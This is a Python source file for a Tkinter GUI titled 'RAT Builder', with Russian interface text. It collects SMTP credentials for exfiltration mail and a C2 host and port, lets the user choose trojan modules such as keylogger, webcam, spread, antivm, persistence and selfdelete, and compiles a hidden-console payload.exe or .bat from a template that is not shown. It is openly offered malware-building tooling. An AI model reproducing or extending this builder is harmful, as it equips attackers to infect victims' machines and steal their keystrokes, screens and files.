# language: Python, file: builder.py
# *SAFE по умолчанию; RDP host/port; проверка магии; сборка pyinstaller/nuitka*
import os, sys, json, subprocess, tempfile, pathlib, shutil
import tkinter as tk
from tkinter import ttk, filedialog, messagebox

if getattr(sys, "frozen", False):
    BASE = pathlib.Path(sys._MEIPASS)
else:
    BASE = pathlib.Path(__file__).parent
TEMPLATE = BASE / "rat_template.py"

class Builder(tk.Tk):
    def __init__(self):
        super().__init__()
        self.title("RAT Builder")
        self.geometry("620x700")
        self.vars, self.mods = {}, {}
        self._ui()

    def _ui(self):
        frm = ttk.Frame(self, padding=10)
        frm.pack(fill="both", expand=True)
        frm.columnconfigure(1, weight=1)

        fields = [
            ("smtp_host", "SMTP host", "smtp.gmail.com"),
            ("smtp_port", "SMTP port", "587"),
            ("smtp_user", "Email (from)", ""),
            ("smtp_pass", "App password", ""),
            ("mail_to",  "Recipient (C2 mail)", ""),
            ("c2_host",  "C2 host (RDP)", "127.0.0.1"),
            ("c2_port",  "C2 port (RDP)", "5555"),
        ]
        r = 0
        for k, label, default in fields:
            ttk.Label(frm, text=label).grid(row=r, column=0, sticky="w", pady=3)
            v = tk.StringVar(value=default)
            ttk.Entry(frm, textvariable=v, width=48,
                      show="*" if k == "smtp_pass" else "").grid(
                row=r, column=1, sticky="ew", pady=3)
            self.vars[k] = v
            r += 1

        ttk.Label(frm, text="Формат").grid(row=r, column=0, sticky="w")
        self.fmt = tk.StringVar(value="exe")
        ttk.Combobox(frm, textvariable=self.fmt,
                     values=["exe", "bat"], state="readonly", width=10
                     ).grid(row=r, column=1, sticky="w"); r += 1

        ttk.Label(frm, text="Компилятор").grid(row=r, column=0, sticky="w")
        self.comp = tk.StringVar(value="pyinstaller")
        ttk.Combobox(frm, textvariable=self.comp,
                     values=["pyinstaller", "nuitka"], state="readonly", width=12
                     ).grid(row=r, column=1, sticky="w"); r += 1

        self.var_safe = tk.BooleanVar(value=True)
        ttk.Checkbutton(frm, text="SAFE_MODE (не ломает систему)",
                        variable=self.var_safe).grid(
            row=r, column=0, columnspan=2, sticky="w", pady=4); r += 1

        mods = ttk.LabelFrame(frm, text="Модули", padding=6)
        mods.grid(row=r, column=0, columnspan=2, sticky="ew", pady=6)
        all_mods = ["persistence", "keylogger", "screenshot", "shell",
                    "download", "upload", "clipboard", "processes",
                    "webcam", "spread", "antivm", "selfdelete", "rdp"]
        for i, m in enumerate(all_mods):
            v = tk.BooleanVar(value=(m in ("rdp", "screenshot")))
            ttk.Checkbutton(mods, text=m, variable=v
                            ).grid(row=i // 3, column=i % 3, sticky="w")
            self.mods[m] = v
        r += 1

        ttk.Button(frm, text="Собрать payload", command=self.build
                   ).grid(row=r, column=0, columnspan=2, pady=10, sticky="ew")

    def build(self):
        cfg = {k: v.get() for k, v in self.vars.items()}
        cfg["safe_mode"] = self.var_safe.get()
        cfg["modules"] = [k for k, v in self.mods.items() if v.get()]
        if not cfg["smtp_user"] or not cfg["smtp_pass"] or not cfg["mail_to"]:
            messagebox.showerror("Ошибка", "Заполни Email, App password, C2 mail.")
            return
        work = pathlib.Path(tempfile.mkdtemp(prefix="ratbuild_"))
        src = work / "rat.py"
        src.write_text(TEMPLATE.read_text(encoding="utf-8").replace(
            "__CFG__", json.dumps(cfg, ensure_ascii=False)), encoding="utf-8")
        out_dir = pathlib.Path(filedialog.askdirectory(title="Куда сохранить"))
        if not out_dir:
            return
        self._compile(src, self.fmt.get(), self.comp.get(), out_dir)

    def _compile(self, src, fmt, comp, out_dir):
        try:
            if fmt == "bat":
                out = out_dir / "payload.bat"
                out.write_text(f'@echo off\r\nstart "" /b "{sys.executable}" "{src}"\r\n',
                               encoding="utf-8")
            else:
                py = sys.executable
                if getattr(sys, "frozen", False):
                    py = shutil.which("python") or shutil.which("py")
                if not py:
                    messagebox.showerror("Ошибка",
                                         "Python не найден в PATH.")
                    return
                if comp == "nuitka":
                    subprocess.run([py, "-m", "nuitka", "--onefile",
                                    "--windows-disable-console",
                                    "--assume-yes-for-downloads",
                                    f"--output-dir={out_dir}",
                                    "--output-filename=payload.exe",
                                    str(src)], check=True)
                else:
                    subprocess.run([py, "-m", "PyInstaller", "--onefile",
                                    "--noconsole", "--name", "payload",
                                    "--hidden-import=rdp_agent_lib",
                                    "--hidden-import=pyautogui",
                                    "--hidden-import=psutil",
                                    "--distpath", str(out_dir), str(src)],
                                   check=True)
                out = out_dir / "payload.exe"
            self._validate(out, fmt)
        except subprocess.CalledProcessError as e:
            messagebox.showerror("Ошибка сборки",
                                 f"PyInstaller/Nuitka упал: {e}")
        except Exception as e:
            messagebox.showerror("Ошибка", str(e))

    def _validate(self, path, fmt):
        try:
            with open(path, "rb") as f:
                head = f.read(8)
            if fmt in ("exe", "dll"):
                ok = head.startswith(b"MZ")
            elif fmt == "msi":
                ok = head.startswith(b"\xd0\xcf\x11\xe0\xa1\xb1\x1a\xe1")
            elif fmt == "bat":
                txt = open(path, "r", errors="ignore").read(4096).lower()
                ok = any(txt.lstrip().startswith(p) for p in ("@echo", "::", "rem ", "echo "))
            else:
                ok = False
        except Exception:
            ok = False
        if not ok:
            try: os.remove(path)
            except OSError: pass
            messagebox.showerror("Ошибка",
                                 "Неверное расширение. Измените на другое!")
            return
        messagebox.showinfo("Готово", f"Файл: {path}")

if __name__ == "__main__":
    Builder().mainloop()
